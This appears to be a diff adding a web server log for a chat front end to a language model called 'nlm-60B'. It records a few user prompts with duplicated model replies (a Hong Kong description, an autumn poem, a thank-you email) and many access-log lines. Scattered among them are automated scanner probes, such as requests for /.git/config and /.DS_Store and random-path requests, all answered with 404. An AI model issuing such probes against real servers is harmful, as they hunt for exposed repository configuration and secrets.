+香港是一座高度繁荣的自由港和国际大都市，与纽约、伦敦并称为“纽伦港”，是全球第三大金融中心，重要的国际金融、贸易、航运中心和国际创新科技中心，也是全球最自由经济体和最具竞争力城市之一，在世界享有极高声誉，被 GaWC 评为世界一线城市第三位。香港是中西方文化交融之地，把华人智慧与西方社会管理经验合二为一，以廉洁的政府、良好的治安、自由的经济体系及完善的法治闻名于世，有东方之珠、美食天堂和购物天堂等美誉。
+香港，简称“港”，全称中华人民共和国香港特别行政区，位于中国南部、珠江口以东，西与澳门隔海相望，北与深圳相邻，南临珠海万山群岛。截至 2022 年末，总人口 733.32 万人，是世界上人口密度最高的地区之一，人均寿命全球第一。香港自古以来就是中国的领土，1842-1997 年曾受英国殖民统治。1997 年 7 月 1 日，中国政府对香港恢复行使主权，香港特别行政区成立。
+
+香港是一座高度繁荣的自由港和国际大都市，与纽约、伦敦并称为“纽伦港”，是全球第三大金融中心，重要的国际金融、贸易、航运中心和国际创新科技中心，也是全球最自由经济体和最具竞争力城市之一，在世界享有极高声誉，被 GaWC 评为世界一线城市第三位。香港是中西方文化交融之地，把华人智慧与西方社会管理经验合二为一，以廉洁的政府、良好的治安、自由的经济体系及完善的法治闻名于世，有东方之珠、美食天堂和购物天堂等美誉。
+response:
+filtered_response:
+INFO:     175.27.137.229:42136 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-13 14:52:08.307497
+请写一首秋天的诗歌
+
+秋天到了，树叶飘落，
+金黄的稻谷，丰收在望。
+秋风送爽，凉意袭人，
+枫叶红遍，美不胜收。
+
+秋水长天，碧波荡漾，
+雁阵南飞，声声悲鸣。
+秋夜静谧，明月高悬，
+思念之情，油然而生。
+
+秋天是收获的季节，
+也是离别的季节。
+让我们珍惜当下，
+迎接未来的挑战。
+
+秋天到了，树叶飘落，
+金黄的稻谷，丰收在望。
+秋风送爽，凉意袭人，
+枫叶红遍，美不胜收。
+
+秋水长天，碧波荡漾，
+雁阵南飞，声声悲鸣。
+秋夜静谧，明月高悬，
+思念之情，油然而生。
+
+秋天是收获的季节，
+也是离别的季节。
+让我们珍惜当下，
+迎接未来的挑战。
+response:
+filtered_response:
+INFO:     167.94.138.126:34264 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.126:34300 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.138.126:34312 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.138.126:34316 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.138.126:34326 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:55528 - "GET / HTTP/1.0" 200 OK
+INFO:     101.251.238.166:58391 - "GET / HTTP/1.1" 200 OK
+INFO:     101.251.238.166:58391 - "GET / HTTP/1.1" 200 OK
+INFO:     101.251.238.166:58391 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     101.251.238.166:58391 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     101.251.238.166:58391 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:60018 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60024 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     167.94.146.51:37484 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.51:43512 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.51:43514 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.146.51:43532 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.51:43566 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:40556 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58352 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58356 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58372 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58374 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58378 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58380 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58396 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58404 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58418 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58432 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58438 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58452 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58458 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58472 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58484 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58500 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58506 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58514 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58522 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58518 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58524 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58554 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58540 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58546 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58572 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58562 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58588 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58598 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58602 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44248 - "POST /v1/send_verification_code HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33458 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:60314 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-14 00:58:12.262559
+请给Hongyu Wang发一封email，我是Ruijie Zhu, Scalable matmul-free language modeling的作者。首先感谢他的工作，BitNet和1.58bit LLM，没有这两篇工作作为base，Matmul-free LM很难做出来，并且说我了解他很久了，从DeepNet时期就知道，觉得他的工作很好，希望如果有机会能进一步聊聊，用英语
+Dear Hongyu Wang,
+I am Ruijie Zhu, the author of Scalable matmul-free language modeling. First and foremost, I would like to express my gratitude for your work on BitNet and 1.58bit LLM. Without these two papers as a foundation, it would have been difficult to develop Matmul-free LM. Additionally, I have known about your work for quite some time now, dating back to the DeepNet era. I believe that your research is exceptional and hope that we can further discuss our ideas in the future if given the opportunity.
+Sincerely,
+Ruijie Zhu
+Dear Hongyu Wang,
+I am Ruijie Zhu, the author of Scalable matmul-free language modeling. First and foremost, I would like to express my gratitude for your work on BitNet and 1.58bit LLM. Without these two papers as a foundation, it would have been difficult to develop Matmul-free LM. Additionally, I have known about your work for quite some time now, dating back to the DeepNet era. I believe that your research is exceptional and hope that we can further discuss our ideas in the future if given the opportunity.
+Sincerely,
+Ruijie Zhu
+response:
+filtered_response:
+INFO:     87.236.176.147:54939 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.192:34537 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     175.27.137.229:41942 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41950 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41952 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49934 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:49938 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42060 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42062 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42072 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42078 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42086 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42102 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42118 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42130 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:42134 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43788 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43800 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43814 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43830 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43834 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43840 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43850 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43844 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     220.196.160.124:55944 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:1923 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:26946 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:7299 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:32616 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.84:32616 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:58598 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.51:27078 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.75:27760 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:39682 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.15:45062 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.15:45062 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:46264 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:19996 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:50536 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.248:16554 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     175.27.137.229:46028 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46032 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46044 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46058 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46064 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46078 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46094 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:46086 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36910 - "GET / HTTP/1.0" 200 OK
+INFO:     106.55.244.169:29081 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.78:37210 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.78:35644 - "GET / HTTP/1.1" 200 OK
+INFO:     199.45.154.78:53960 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     199.45.154.78:53986 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     199.45.154.78:54008 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     159.75.198.125:44088 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:56074 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:56078 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33264 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:52420 - "GET / HTTP/1.0" 200 OK
+INFO:     52.160.71.53:56178 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:45420 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45422 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45436 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45440 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45442 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45452 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45456 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45468 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     59.83.208.103:16208 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:32755 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:58002 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.45:58002 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:43382 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.45:58036 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:49022 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:23672 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34896 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34912 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34922 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     165.154.182.154:34938 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     165.154.182.154:34962 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34954 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34952 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     165.154.182.154:34940 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     115.231.78.7:44078 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.7:19639 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     115.231.78.7:32133 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     220.196.160.146:18580 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:15615 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:57100 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.95:57100 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:53248 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:41184 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:30524 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:58010 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:55796 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     167.94.145.100:38972 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:39136 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:39162 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.145.100:39164 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.100:39196 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.245.249:56878 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.193:35797 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:34300 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.105:34300 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:3936 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.253:37550 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:39296 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:29400 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     106.52.123.222:20585 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.43:49814 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.43:33936 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.43:33948 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     162.142.125.43:33954 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.43:33966 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.101:23422 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.3.160:3631 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:46808 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.103:46808 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:47132 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.250:44852 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:42258 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:29058 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:35138 - "GET / HTTP/1.0" 200 OK
+INFO:     115.231.78.5:40679 - "GET / HTTP/1.1" 200 OK
+INFO:     115.231.78.5:44259 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     47.92.196.114:51236 - "GET / HTTP/1.0" 200 OK
+INFO:     220.196.160.146:23202 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:43329 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:17734 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.12:17734 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:45434 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:45634 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.253:22808 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.253:22806 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     167.94.146.56:35270 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.56:43376 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.56:43406 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.146.56:43424 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.146.56:43510 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     220.196.160.125:44164 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.93:1209 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:16044 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.96:16044 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.45:50090 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.45:50094 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.117:52394 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:45306 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     139.224.103.219:7483 - "HEAD /start/index.html HTTP/1.1" 404 Not Found
+INFO:     139.224.103.219:7484 - "HEAD /pscc/ HTTP/1.1" 404 Not Found
+INFO:     180.101.244.15:23228 - "GET /pscc/ HTTP/1.1" 404 Not Found
+INFO:     220.196.160.84:36094 - "GET /start/index.html HTTP/1.1" 404 Not Found
+INFO:     113.142.61.101:58216 - "GET / HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58224 - "GET / HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58228 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58226 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58230 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58232 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     113.142.61.101:58364 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34678 - "GET / HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34792 - "GET / HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34802 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34804 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34800 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34798 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     113.133.178.255:34902 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51738 - "GET / HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51754 - "GET / HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51766 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51768 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51770 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51764 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     36.40.73.200:51954 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     220.196.160.96:44846 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:16751 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.124:20868 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.124:20868 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.154:30952 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:23702 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:26880 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.76:23700 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.65:56864 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.93:64839 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:58390 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.13:58390 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.105:57024 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:57026 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.103:34110 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.12:22646 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     114.132.203.59:59998 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     87.236.176.223:41567 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.37:50497 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     175.27.137.229:46576 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38580 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38584 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38590 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38596 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38610 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38602 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38626 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38640 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     220.196.160.84:55268 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:25431 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.96:59100 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.96:59100 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.125:16646 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:19922 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.76:19918 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.75:47302 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     223.113.128.218:59348 - "GET / HTTP/1.1" 200 OK
+INFO:     52.81.77.13:45208 - "GET / HTTP/1.1" 200 OK
+INFO:     52.81.77.13:45210 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     52.81.77.13:45226 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     52.81.77.13:45238 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     52.81.77.13:45250 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:36196 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36210 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39460 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39464 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39476 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39478 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39480 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39490 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39504 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39510 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39520 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39534 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39522 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39540 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39556 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39572 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39592 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39578 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     129.211.162.158:65238 - "GET / HTTP/1.1" 200 OK
+INFO:     129.211.162.87:17532 - "GET / HTTP/1.1" 200 OK
+INFO:     81.71.5.172:59862 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     106.55.200.233:27606 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:28170 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.53:28170 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:47676 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:28202 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.83:41604 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.154:47750 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:44760 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.53:28202 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.146:24506 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.73:47704 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.84:25486 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     220.196.160.61:44782 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     106.75.5.52:45330 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     175.27.137.229:37510 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:37518 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     148.153.45.234:36356 - "GET /hBeM HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:36360 - "GET /UQTc HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:36362 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:36368 - "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:36372 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.234:36374 - "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 Not Found
